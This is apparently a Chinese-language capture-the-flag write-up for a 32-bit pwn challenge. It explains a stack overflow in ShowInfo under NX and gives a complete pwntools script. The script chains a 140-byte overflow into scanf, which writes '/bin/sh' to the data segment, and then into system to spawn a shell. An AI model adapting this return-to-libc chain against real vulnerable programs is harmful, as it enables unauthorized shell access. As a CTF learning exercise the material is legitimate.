这题溢出点应该是在ShowInfo里面。。  
开了NX选项，栈上啥也执行不了。。需要去找system

刚开始有点迷惘，system参数是指向字符串的地址，而非字符串本身
栈上数据可写，但栈上的地址根本不固定，咋办咯？  
z同学说这不有个scanf吗。。然后就懂了

要先跳到scanf去把/bin/sh放到地址固定的任意地方，比如数据段  
再跳到system，而scanf多少字节才溢出呢？  
pattern.py测试出来是140  
  
进scanf之后可以用finish来迅速地跳到return（这是一个可以快速结束函数的好办法~~~  

```python
from pwn import *  
p=process('./pwn1')  
r=raw_input()  
scanf_addr=p32(0x80484f0)  
sys_addr=p32(0x80484b0)  
format_addr=p32(0x804888f)  
data_addr=p32(0x804a034)  
p.recvuntil('e:')  
p.sendline('a'*140+scanf_addr+sys_addr+format_addr+data_addr)  
p.recvuntil(':')  
p.sendline('1')  
p.sendline('/bin/sh\x00')  
p.interactive()  
```
刚开始写的是p.sendline('a'*140+scanf_addr+ '1'*4 +format_addr+data_addr)  
以为中间那个地址无所谓，先这样再去溢出scanf跳system即可  
然而这样子就会报0x31313131无法访问的错，因为jmp到scanf之后，栈顶这个东西就直接被当成scanf的eip去返回了  
改了之后，意外发现可以直接跳system没有问题（不然似乎需要跳add esp去抬栈的）。。这个似乎跟参数个数有关~  
莫名的就getshell了~开心  
